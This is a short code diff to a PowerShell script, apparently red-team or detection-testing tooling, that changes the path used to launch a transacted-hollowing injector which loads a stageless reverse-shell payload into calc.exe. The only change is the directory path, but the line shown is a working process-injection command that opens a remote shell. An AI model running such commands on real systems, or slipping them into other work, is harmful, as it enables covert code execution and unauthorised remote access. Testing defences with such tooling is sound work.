@@ -296,7 +296,7 @@ function Inject-Process {
 
         Write-Host "[*] Transacted Hollowing - rev shell" -ForegroundColor Cyan
 
-        & $home_folder\Unmonitored\transacted_hollowing\transacted_hollowing64.exe $home_folder\transacted_hollowing\shell-x64_stageless_9999.exe $home_folder\transacted_hollowing\calc.exe |out-null
+        & $home_folder\transacted_hollowing\transacted_hollowing64.exe $home_folder\transacted_hollowing\shell-x64_stageless_9999.exe $home_folder\transacted_hollowing\calc.exe |out-null
 
         Start-Sleep -Seconds 5
 
